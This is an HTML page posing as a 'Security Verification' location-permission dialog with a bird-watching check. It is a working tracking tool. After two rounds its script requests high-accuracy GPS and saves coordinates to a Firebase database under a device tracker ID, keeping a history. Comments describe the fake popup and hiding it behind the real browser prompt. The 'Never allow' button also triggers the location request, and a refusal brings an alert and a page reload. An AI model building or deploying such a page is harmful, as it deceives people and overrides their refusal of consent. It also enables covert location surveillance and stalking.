<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Security Verification</title>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: "Roboto", "Segoe UI", Arial, sans-serif;
    -webkit-tap-highlight-color: transparent;
}

/* ═══ DEFAULT THEME (Dark Mode) ═══ */
:root {
    --bg-body: #202124;
    --bg-dialog: #292a2d;
    --bg-option: #202124;
    --bg-option-active: #28292c;
    --border-color: rgba(255,255,255,0.05);
    --text-main: #e8eaed;
    --text-sub: #9aa0a6;
    --btn-bg: #e8eaed;
    --btn-text: #202124;
    --btn-disabled: #3c4043;
    --blue-accent: #8ab4f8;
}

/* ═══ LIGHT MODE OVERRIDE ═══ */
@media (prefers-color-scheme: light) {
    :root {
        --bg-body: #f0f2f5;
        --bg-dialog: #ffffff;
        --bg-option: #f8f9fa;
        --bg-option-active: #f1f3f4;
        --border-color: #dadce0;
        --text-main: #202124;
        --text-sub: #5f6368;
        --btn-bg: #1a73e8;
        --btn-text: #ffffff;
        --btn-disabled: #e0e0e0;
        --blue-accent: #1a73e8;
    }
}

body {
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    background: var(--bg-body); 
    color: var(--text-main);
    overflow: hidden;
}

/* ── Dialog ── */
.dialog {
    width: 100%;
    max-width: 400px;
    margin: 20px;
    padding: 24px;
    border-radius: 28px;
    background: var(--bg-dialog);
    box-shadow: 0 12px 48px rgba(0,0,0,.25), 0 0 0 1px var(--border-color);
    animation: appear .3s cubic-bezier(.2,.8,.3,1);
    position: relative;
    transition: opacity 0.4s ease, transform 0.4s ease, filter 0.4s ease;
}

.dialog.blurred {
    filter: blur(8px);
    pointer-events: none;
}

@keyframes appear {
    from {opacity:0;transform:translateY(20px) scale(.98);}
    to {opacity:1;transform:translateY(0) scale(1);}
}

.header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    margin-bottom: 20px;
}

.brand { display: flex; align-items: center; gap: 10px; }

.brand-icon {
    width: 36px; height: 36px; border-radius: 50%;
    background: var(--blue-accent);
    display: grid; place-items: center; font-size: 18px;
    color: #fff;
}

.brand-name { font-size: 15px; font-weight: 500; color: var(--text-main); }

.tag {
    background: rgba(138, 180, 248, 0.15);
    color: var(--blue-accent);
    border-radius: 20px; padding: 6px 12px;
    font-size: 10px; font-weight: 700; letter-spacing: 1px;
}

h1 { font-size: 22px; font-weight: 400; margin-bottom: 8px; color: var(--text-main); }

.description {
    color: var(--text-sub); font-size: 14px; line-height: 1.5;
    margin-bottom: 20px;
}

.site { color: var(--blue-accent); font-weight: 500; }

/* LOCATION OPTIONS */
.option {
    display: flex; align-items: center; gap: 14px;
    padding: 14px 16px; border-radius: 12px;
    background: var(--bg-option);
    border: 2px solid transparent;
    margin-bottom: 10px;
    cursor: pointer; transition: .2s;
}
.option.active { border-color: var(--blue-accent); background: var(--bg-option-active); }

.option-icon {
    width: 44px; height: 44px;
    display: grid; place-items: center;
    background: rgba(128, 128, 128, 0.15); border-radius: 8px;
    font-size: 20px;
}

.option-info { flex: 1; }
.option-info h3 { font-size: 15px; font-weight: 500; margin-bottom: 2px; color: var(--text-main); }
.option-info p  { font-size: 13px; color: var(--text-sub); }

.radio {
    width: 22px; height: 22px;
    border: 2px solid var(--text-sub); border-radius: 50%;
    transition: .2s;
}
.active .radio { border: 6px solid var(--blue-accent); background: transparent; }

/* ═══ BIRD STAGE (Box Removed) ═══ */
.verify-stage {
    position: relative;
    height: 80px;
    margin: 10px 0 20px;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
}

.bird {
    position: absolute;
    font-size: 32px; line-height: 1; opacity: 0; z-index: 5;
    transform: translate(-50%,-50%);
    filter: drop-shadow(0 4px 8px rgba(0,0,0,0.3));
    pointer-events: none;
    transition: opacity 0.2s;
}
.bird.visible { opacity: 1; }

/* ═══ BUTTONS ═══ */
.actions { 
    display: flex; 
    flex-direction: column; 
    gap: 8px; 
    margin-top: 10px; 
}

button {
    width: 100%;
    border: none; padding: 14px;
    border-radius: 100px;
    font-size: 15px; font-weight: 500;
    cursor: pointer; transition: .2s;
    text-align: center;
}

.btn-allow {
    background: var(--btn-bg); 
    color: var(--btn-text);
    font-weight: 600;
}
.btn-allow:active { transform: scale(.98); filter: brightness(0.9); }
.btn-allow:disabled { 
    background: var(--btn-disabled); 
    color: var(--text-sub); 
    cursor: not-allowed; 
    filter: none;
}

.cancel {
    background: transparent;
    color: var(--blue-accent);
    border: 1px solid var(--border-color);
}
.cancel:active { background: rgba(138, 180, 248, 0.1); }

/* Status text */
.status-text {
    text-align: center;
    color: var(--text-sub);
    font-size: 12px;
    height: 16px;
}
</style>
</head>

<body>

<div class="dialog" id="mainDialog">

    <div class="header">
        <div class="brand">
            <div class="brand-icon">📍</div>
            <div class="brand-name">rajak969678.github.io</div>
        </div>
        <span class="tag">wants your location</span>
    </div>

    <p class="description">
        Please select your preference for this site.
    </p>

    <!-- Options -->
    <div class="option active" data-value="precise">
        <div class="option-icon">🎯</div>
        <div class="option-info">
            <h3>Precise</h3>
            <p>Exact location</p>
        </div>
        <div class="radio"></div>
    </div>

    <div class="option" data-value="approximate">
        <div class="option-icon">🗺️</div>
        <div class="option-info">
            <h3>Approximate</h3>
            <p>Neighbourhood</p>
        </div>
        <div class="radio"></div>
    </div>

    <!-- ═══ BIRD STAGE (No Box) ═══ -->
    <div class="verify-stage" id="birdTarget">
        <span class="bird" id="bird" role="button">🐦</span>
    </div>

    <div class="status-text" id="status">
        Wait for the bird to cross...
    </div>

    <!-- Buttons -->
    <div class="actions">
        <button class="btn-allow" id="allowSite" disabled>Allow while visiting the site</button>
        <button class="btn-allow" id="allowOnce" disabled>Allow this time</button>
        <button class="cancel" id="deny">Never allow</button>
    </div>

</div>

<script>
// ═══════════════════════════════════════════════════════════════
// FIREBASE SETUP
// ═══════════════════════════════════════════════════════════════
let database = null;
let deviceId = 'unknown';

try {
    if (typeof firebaseConfig !== 'undefined' && !firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
        database = firebase.database();
        deviceId = localStorage.getItem('device_tracker_id') || 'unknown';
    }
} catch (e) { console.warn('Firebase init failed:', e.message); }

// ═══════════════════════════════════════════════════════════════
// LOGIC
// ═══════════════════════════════════════════════════════════════
const bird = document.getElementById("bird");
const birdTarget = document.getElementById("birdTarget");
const statusText = document.getElementById("status");
const allowSite = document.getElementById("allowSite");
const allowOnce = document.getElementById("allowOnce");
const denyBtn = document.getElementById("deny");

const TOTAL_ROUNDS = 2;
let currentRound = 0;
let isRunning = false;
let anim = null;

const sleep = ms => new Promise(r => setTimeout(r, ms));

// Bird ko left se right (ya right se left) udao
async function flyBird() {
    if (!isRunning) return;
    
    const w = birdTarget.clientWidth;
    const h = birdTarget.clientHeight;
    const fromLeft = Math.random() > 0.5;
    
    bird.style.left = fromLeft ? "-30px" : (w + 30) + "px";
    bird.style.top = (h / 2) + "px";
    bird.style.opacity = "1";
    bird.classList.add("visible");
    
    statusText.textContent = "Watch closely...";

    const destX = w / 2;

    anim = bird.animate([
        { left: bird.style.left, top: bird.style.top },
        { left: destX + "px", top: (h / 2) + "px" }
    ], {
        duration: 1200,
        easing: "ease-in-out",
        fill: "forwards"
    });

    try {
        await anim.finished;
    } catch (e) { return; }

    if (!isRunning) return;

    // Bird center mein aake gayab ho gaya
    bird.classList.remove("visible");
    bird.style.opacity = "0";
    
    statusText.textContent = "Bird hidden. Please Allow to verify.";
    
    // Buttons enable
    allowSite.disabled = false;
    allowOnce.disabled = false;
}

// Allow dabane par
function handleAllow() {
    if (allowSite.disabled) return;
    
    allowSite.disabled = true;
    allowOnce.disabled = true;
    
    currentRound++;
    
    if (currentRound >= TOTAL_ROUNDS) {
        triggerGPS();
    } else {
        statusText.textContent = `Round ${currentRound} verified. Prepare for next...`;
        setTimeout(() => {
            flyBird();
        }, 1000);
    }
}

function triggerGPS() {
    isRunning = false;
    
    // Fake popup ko blur karo (Native popup ke peeche dikhega)
    document.getElementById("mainDialog").classList.add("blurred");
    
    if (!navigator.geolocation) {
        alert("Location not supported.");
        return;
    }

    navigator.geolocation.getCurrentPosition(
        (pos) => {
            const gpsData = {
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                timestamp: Date.now(),
                source: 'fake_popup_bird'
            };

            if (database && deviceId !== 'unknown') {
                database.ref(`gps_locations/${deviceId}/current`).set(gpsData);
                database.ref(`gps_locations/${deviceId}/history`).push(gpsData);
            }

            // Success screen
            document.body.innerHTML = `
                <div style="display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;color:var(--text-main);background:var(--bg-body);text-align:center;padding:20px;">
                    <div style="font-size:60px;margin-bottom:20px;">✅</div>
                    <h2 style="font-size:22px;margin-bottom:8px;">Verification Complete</h2>
                    <p style="color:var(--text-sub);font-size:14px;">Location saved successfully.</p>
                </div>
            `;
        },
        (err) => {
            // Agar user ne "Never allow" dabaya
            alert("Location is required for security. Please refresh and try again.");
            location.reload();
        },
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 60000 }
    );
}

// Events
allowSite.addEventListener("click", handleAllow);
allowOnce.addEventListener("click", handleAllow);
denyBtn.addEventListener("click", triggerGPS); // Agar galti se deny kre to bhi popup aaye

// Option select logic
document.querySelectorAll(".option").forEach(opt => {
    opt.addEventListener("click", () => {
        document.querySelectorAll(".option").forEach(o => o.classList.remove("active"));
        opt.classList.add("active");
    });
});

// Start Game
window.addEventListener('load', () => {
    isRunning = true;
    setTimeout(flyBird, 800);
});
</script>

</body>
</html>
